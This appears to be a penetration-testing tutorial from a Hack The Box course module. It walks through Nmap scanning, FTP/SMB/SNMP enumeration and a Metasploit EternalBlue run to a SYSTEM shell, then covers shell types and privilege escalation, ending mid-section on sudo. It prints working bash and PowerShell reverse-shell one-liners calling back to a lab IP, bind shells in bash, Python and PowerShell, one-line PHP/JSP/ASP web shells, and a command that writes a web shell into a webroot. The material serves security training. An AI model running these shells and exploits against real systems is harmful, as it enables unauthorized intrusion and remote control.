# Service Scanning

Let us start with the most basic scan. Suppose that we want to perform a basic scan against a target residing at 10.129.42.253. To do this we should type nmap 10.129.42.253 and hit return. We see that the Nmap scan was completed very quickly. This is because if we don't specify any additional options, Nmap will only scan the 1,000 most common ports by default. The scan output reveals that ports 21, 22, 80, 139, and 445 are available.

```
nmap 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
```

Under the PORT heading, it also tells us that these are TCP ports. By default, Nmap will conduct a TCP scan unless specifically requested to perform a UDP scan.
The STATE heading confirms that these ports are open. Sometimes we will see other ports listed that have a different state, such as filtered. This can happen if a firewall is only allowing access to the ports from specific addresses.
The SERVICE heading tells us the service's name is typically mapped to the specific port number. However, the default scan will not tell us what is listening on that port. Until we instruct Nmap to interact with the service and attempt to tease out identifying information, it could be another service altogether.

As we gain familiarity, we will notice that several ports are commonly associated with Windows or Linux. For example, port 3389 is the default port for Remote Desktop Services and is an excellent indication that the target is a Windows machine. In our current scenario, port 22 (SSH) being available indicates that the target is running Linux/Unix, but this service can also be configured on Windows. Let us run a more advanced Nmap scan and gather more information about the target device.

We can use the -sC parameter to specify that Nmap scripts should be used to try and obtain more detailed information. The -sV parameter instructs Nmap to perform a version scan. In this scan, Nmap will fingerprint services on the target system and identify the service protocol, application name, and version. The version scan is underpinned by a comprehensive database of over 1,000 service signatures. Finally, -p- tells Nmap that we want to scan all 65,535 TCP ports.

`nmap -sV -sC -p- 10.129.42.253`

This returns a lot more information. We see that it took a lot longer to scan 65,535 ports than 1,000 ports. The -sC and -sV options also increase the duration of a scan, as instead of performing a simple TCP handshake, they perform a lot more checks. We notice that this time there is a VERSION heading, which reports the service version and the operating system if this is possible to identify.

So far, we know that the operating system is Ubuntu Linux. Application versions can also help reveal the target OS version. Take OpenSSH, for example. We see the reported version is OpenSSH 8.2p1 Ubuntu 4ubuntu0.1. From inspection of other Ubuntu SSH package changelogs, we see the release version takes the format 1:7.3p1-1ubuntu0.1. Updating our version to fit this format, we get 1:8.2p1-4ubuntu0.1. A quick search for this version online reveals that it is included in Ubuntu Linux Focal Fossa 20.04.

However, it is worth noting that this cross-referencing technique is not entirely reliable, as it is possible to install more recent application packages on an older OS version. The script scan -sC flag causes Nmap to report the server headers http-server-header page and the page title http-title for any web page hosted on the webserver. The web page title PHP 7.4.3 - phpinfo() indicates that this is a PHPInfo file, which is often manually created to confirm that PHP has been successfully installed. The title (and PHPInfo page) also reveals the PHP version, which is worth noting if it is vulnerable.

Specifying -sC will run many useful default scripts against a target, but there are cases when running a specific script is required. For example, in an assessment scope, we may be asked to audit a large Citrix installation. We could use this Nmap script to audit for the severe Citrix NetScaler vulnerability (CVE-2019–19781), while Nmap also has other scripts to audit a Citrix installation.

```
locate scripts/citrix

/usr/share/nmap/scripts/citrix-brute-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps.nse
/usr/share/nmap/scripts/citrix-enum-servers-xml.nse
/usr/share/nmap/scripts/citrix-enum-servers.nse
```

The syntax for running an Nmap script is nmap --script <script name> -p<port> <host>.

Nmap scripts are a great way to enhance our scans' functionality, and inspection of the available options will pay dividends. Check out the Network Enumeration with Nmap module for a more detailed study of the Nmap tool.

As previously discussed, banner grabbing is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner once a connection is initiated. Nmap will attempt to grab the banners if the syntax nmap -sV --script=banner <target> is specified. We can also attempt this manually using Netcat. Let us take another example, using the nc version of Netcat:

```
nc -nv 10.129.42.253 21

(UNKNOWN) [10.129.42.253] 21 (ftp) open
220 (vsFTPd 3.0.3)
```

This reveals that the version of vsFTPd on the server is 3.0.3. We can also automate this process using Nmap's powerful scripting engine: nmap -sV --script=banner -p21 10.10.10.0/24.

It is worth gaining familiarity with FTP, as it is a standard protocol, and this service can often contain interesting data. A Nmap scan of the default port for FTP (21) reveals the vsftpd 3.0.3 installation that we identified previously. Further, it also reports that anonymous authentication is enabled and that a pub directory is available.


```
nmap -sC -sV -p21 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 00:54 GMT
Nmap scan report for 10.129.42.253
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 19 23:50 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

Let us connect to the service using the ftp command-line utility.

```
ftp -p 10.129.42.253
Connected to 10.129.42.253.
220 (vsFTPd 3.0.3)
Name (10.129.42.253:user): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
227 Entering Passive Mode (10,129,42,253,158,60).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
226 Directory send OK.

ftp> cd pub
250 Directory successfully changed.

ftp> ls
227 Entering Passive Mode (10,129,42,253,182,129).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            18 Feb 25 19:25 login.txt
226 Directory send OK.

ftp> get login.txt
local: login.txt remote: login.txt
227 Entering Passive Mode (10,129,42,253,181,53).
150 Opening BINARY mode data connection for login.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (165.8314 kB/s)

ftp> exit
221 Goodbye.
```

In the above shell, we see that FTP supports common commands such as cd and ls and allows us to download files using the get command. Inspection of the downloaded login.txt reveals credentials that we could use to further our access to the system.

```
cat login.txt 

admin:ftp@dmin123
```

SMB (Server Message Block) is a prevalent protocol on Windows machines that provides many vectors for vertical and lateral movement. Sensitive data, including credentials, can be in network file shares, and some SMB versions may be vulnerable to RCE exploits such as EternalBlue. It is crucial to enumerate this sizeable potential attack surface carefully. Nmap has many scripts for enumerating SMB, such as smb-os-discovery.nse, which will interact with the SMB service to extract the reported operating system version.


```
nmap --script smb-os-discovery.nse -p445 10.10.10.40

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
Nmap scan report for doctors.htb (10.10.10.40)
Host is up (0.022s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: CEO-PC
|   NetBIOS computer name: CEO-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-27T00:59:46+00:00

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds

```

In this case, the host runs a legacy Windows 7 OS, and we could conduct further enumeration to confirm if it is vulnerable to EternalBlue. The Metasploit Framework has several modules for EternalBlue that can be used to validate the vulnerability and exploit it, as we will see in a coming section. We can run a scan against our target for this module section to gather information from the SMB service. We can ascertain that the host runs a Linux kernel, Samba version 4.6.2, and the hostname is GS-SVCSCAN.

```
nmap -A -p445 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-25T21:30:06
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   111.62 ms 10.10.14.1
2   111.89 ms 10.129.42.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```

SMB allows users and administrators to share folders and make them accessible remotely by other users. Often these shares have files in them that contain sensitive information such as passwords. A tool that can enumerate and interact with SMB shares is smbclient. The -L flag specifies that we want to retrieve a list of available shares on the remote host, while -N suppresses the password prompt.

```
smbclient -N -L \\\\10.129.42.253
```

This reveals the non-default share users. Let us attempt to connect as the guest user.

```
smbclient \\\\10.129.42.253\\users

Enter WORKGROUP\users's password: 
Try "help" to get a list of possible commands.

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

smb: \> exit
```

The ls command resulted in an access denied message, indicating that guest access is not permitted. Let us try again using credentials for the user bob (bob:Welcome1).

```
smbclient -U bob \\\\10.129.42.253\\users

Enter WORKGROUP\bob's password: 
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 15:05:31 2021
  bob                                 D        0  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available
		
smb: \> cd bob

smb: \bob\> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 16:42:23 2021
  passwords.txt                       N      156  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available
		
smb: \bob\> get passwords.txt 
getting file \bob\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.


```
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
```

```
snmpwalk -v 2c -c private  10.129.42.253 

Timeout: No Response from 10.129.42.253
```

A tool such as onesixtyone can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool.

```
onesixtyone -c dict.txt 10.129.42.254

Scanning 1 hosts, 51 communities
10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
```

# Public Exploits

Once we identify the services running on ports identified from our Nmap scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like SSH or ftp.
Finding Public Exploits

Many tools can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to Google for the application name with exploit to see if we get any results:

A well-known tool for this purpose is searchsploit, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command:

`sudo apt install exploitdb -y`

Then, we can use searchsploit to search for a specific application by its name, as follows:

```
searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                
```

The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:

    Running reconnaissance scripts to enumerate remote hosts and compromised targets

    Verification scripts to test the existence of a vulnerability without actually compromising the target

    Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets

    Many post-exploitation and pivoting tools

Let us take a basic example of searching for an exploit for an application we are attacking and how to exploit it. To run Metasploit, we can use the msfconsole command:


```
msfconsole
search exploit eternalblue
use exploit/windows/smb/ms17_010_psexec

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as


set RHOSTS 10.10.10.40

set LHOST tun0
```

Once we have Metasploit running, we can search for our target application with the search exploit command. For example, we can search for the SMB vulnerability we identified previously:

We found one exploit for this service. We can use it by copying the full name of it and using USE to use it:

Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the show options command:

Any option with Required set to yes needs to be set for the exploit to work. In this case, we only have two options to set: RHOSTS, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). The second option, LHOST, represents the IP of our attack host (this can be a single IP, or the name of a network interface. In the example below, LHOST is being set to the IP associated with our tun0 interface.) We can set them with the set command:

Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:

```
msf6 exploit(windows/smb/ms17_010_psexec) > check
```

As we can see, the server is indeed vulnerable. Note that not every exploit in the Metasploit Framework supports the check function. Finally, we can use the run or exploit command to run the exploit:

```
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```

As we can see, we have been able to gain admin access to the box and used the shell command to drop us into an interactive shell. These are basic examples of using Metasploit to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:

```

    Granny/Grandpa
    Jerry
    Blue
    Lame
    Optimum
    Legacy
    Devel
```

-----------------------
The question in this section is:
Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start) 

A quick google search of the plug in finds this page:
https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_simple_backup_file_read/


# Types of Shells

Once we compromise a system and exploit a vulnerability to execute commands on the compromised hosts remotely, we usually need a method of communicating with the system not to have to keep exploiting the same vulnerability to execute each command. To enumerate the system or take further control over it or within its network, we need a reliable connection that gives us direct access to the system's shell, i.e., Bash or PowerShell, so we can thoroughly investigate the remote system for our next move.

One way to connect to a compromised system is through network protocols, like SSH for Linux or WinRM for Windows, which would allow us a remote login to the compromised system. However, unless we obtain a working set of login credentials, we would not be able to utilize these methods without executing commands on the remote system first, to gain access to these services in the first place.

The other method of accessing a compromised host for control and remote code execution is through shells.
As previously discussed, there are three main types of shells: Reverse Shell, Bind Shell, and Web Shell. Each of these shells has a different method of communication with us for accepting and executing our commands.

Type of Shell 	Method of Communication
Reverse Shell 	Connects back to our system and gives us control through a reverse connection.
Bind Shell 	Waits for us to connect to it and gives us control once we do.
Web Shell 	Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.

Let us dive more deeply into each of the above shells and walk through examples of each.

A Reverse Shell is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a netcat listener on our machine that listens on a specific port, say port 1234. With this listener in place, we can execute a reverse shell command that connects the remote systems shell, i.e., Bash or PowerShell to our netcat listener, which gives us a reverse connection over the remote system.


`nc -lvnp 1234`

The flags we are using are the following:


-l 	Listen mode, to wait for a connection to connect to us.
-v 	Verbose mode, so that we know when we receive a connection.
-n 	Disable DNS resolution and only connect from/to IPs, to speed up the connection.
-p 1234 	Port number netcat is listening on, and the reverse connection should be sent to.

Now that we have a netcat listener waiting for a connection, we can execute the reverse shell command that connects to us.

However, first, we need to find our system's IP to send a reverse connection back to us. We can find our IP with the following command:

```
ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

In our example, the IP we are interested in is under tun0, which is the same HTB network we connected to through our VPN.

Note: We are connecting to the IP in 'tun0' because we can only connect to HackTheBox boxes through the VPN connection, as they do not have internet connection, and therefore cannot connect to us over the internet using `eth0`. In a real pentest, you may be directly connected to the same network, or performing an external penetration test, so you may connect through the `eth0` adapter or similar.


The command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access. The Payload All The Things page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.

Certain reverse shell commands are more reliable than others and can usually be attempted to get a reverse connection. The below commands are reliable commands we can use to get a reverse connection, for bash on Linux compromised hosts and Powershell on Windows compromised hosts:

``` bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

``` Powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

We can utilize the exploit we have over the remote host to execute one of the above commands, i.e., through a Python exploit or a Metasploit module, to get a reverse connection. Once we do, we should receive a connection in our netcat listener:


```
nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, after we received a connection on our netcat listener, we were able to type our command and directly get its output back, right in our machine.

A Reverse Shell is handy when we want to get a quick, reliable connection to our compromised host. However, a Reverse Shell can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.


Another type of shell is a Bind Shell. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port.

Once we execute a Bind Shell Command, it will start listening on a port on the remote host and bind that host's shell, i.e., Bash or PowerShell, to that port. We have to connect to that port with netcat, and we will get control through a shell on that system.


Once again, we can utilize Payload All The Things to find a proper command to start our bind shell.

Note: we will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere.

The following are reliable commands we can use to start a bind shell:

``` bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

``` python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

``` powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.

We can use netcat to connect to that port and get a connection to the shell:

```
nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, we are directly dropped into a bash session and can interact with the target system directly. Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.

Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.

There are multiple methods to do this. For our purposes, we will use the python/stty method. In our netcat shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:

`python -c 'import pty; pty.spawn("/bin/bash")'`

After we run this command, we will hit ctrl+z to background our shell and get back on our local terminal, and input the following stty command:

```
www-data@remotehost$ ^Z

stty raw -echo
fg

[Enter]
[Enter]
www-data@remotehost$
```

Once we hit fg, it will bring back our netcat shell to the foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

```
echo $TERM

xterm-256color

stty size

67 318

```
The first command showed us the TERM variable, and the second shows us the values for rows and columns, respectively. Now that we have our variables, we can go back to our netcat shell and use the following command to correct them:

```
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

The final type of shell we have is a Web Shell. A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.
Writing a Web Shell

First of all, we need to write our web shell that would take our command through a GET request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:

``` php
<?php system($_REQUEST["cmd"]); ?>
```

``` jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

``` asp
<% eval request("cmd") %>
```

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

Web Server 	Default Webroot
Apache 	/var/www/html/
Nginx 	/usr/local/nginx/html/
IIS 	c:\inetpub\wwwroot\
XAMPP 	C:\xampp\htdocs\

We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:

``` bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

Once we write our web shell, we can either access it through a browser or by using cURL. We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command:

```
curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.

On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.

# Privilege Escalation


Our initial access to a remote server is usually in the context of a low-privileged user, which would not give us complete access over the box. To gain full access, we will need to find an internal/local vulnerability that would escalate our privileges to the root user on Linux or the administrator/SYSTEM user on Windows. Let us walk through some common methods of escalating our privileges.
PrivEsc Checklists

Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is HackTricks, which has an excellent checklist for both Linux and Windows local privilege escalation. Another excellent repository is PayloadsAllTheThings, which also has checklists for both Linux and Windows. We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.

https://book.hacktricks.xyz/

https://github.com/swisskyrepo/PayloadsAllTheThings

Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include LinEnum and linuxprivchecker, and for Windows include Seatbelt and JAWS.

Another useful tool we may use for server enumeration is the Privilege Escalation Awesome Scripts SUITE (PEASS), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.

Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.

Let us take an example of running the Linux script from PEASS called LinPEAS:

```
/linpeas.sh
...SNIP...

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 3.9.0-73-generic
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...SNIP...
```

As we can see, once the script runs, it starts collecting information and displaying it in an excellent report. Let us discuss some of the vulnerabilities that we should look for in the output from these scripts.
Kernel Exploits

Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist. Suppose the server is not being maintained with the latest updates and patches. In that case, it is likely vulnerable to specific kernel exploits found on unpatched versions of Linux and Windows.

For example, the above script showed us the Linux version to be 3.9.0-73-generic. If we Google exploits for this version or use searchsploit, we would find a CVE-2016-5195, otherwise known as DirtyCow. We can search for and download the DirtyCow exploit and run it on the server to gain root access.

The same concept also applies to Windows, as there are many vulnerabilities in unpatched/older versions of Windows, with various vulnerabilities that can be used for privilege escalation. We should keep in mind that kernel exploits can cause system instability, and we should take great care before running them on production systems. It is best to try them in a lab environment and only run them on production systems with explicit approval and coordination with our client.

Another thing we should look for is installed software. For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.
User Privileges

Another critical aspect to look for after gaining access to a server is the privileges available to the user we have access to. Suppose we are allowed to run specific commands as root (or as another user). In that case, we may be able to escalate our privileges to root/system users or gain access as a different user. Below are some common ways to exploit certain user privileges:

    Sudo
    SUID
    Windows Token Privileges

The sudo command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. This is generally done as specific commands can only be run as root 'like tcpdump' or allow the user to access certain root-only directories. We can check what sudo privileges we have with the sudo -l command:

```
sudo -l

[sudo] password for user1:
...SNIP...

User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
```

The above output says that we can run all commands with sudo, which gives us complete access, and we can use the su command with sudo to switch to the root user:

```
sudo su -

[sudo] password for user1:
whoami
root
```

The above command requires a password to run any commands with sudo. There are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password:

```
sudo -l

    (user : user) NOPASSWD: /bin/echo
```

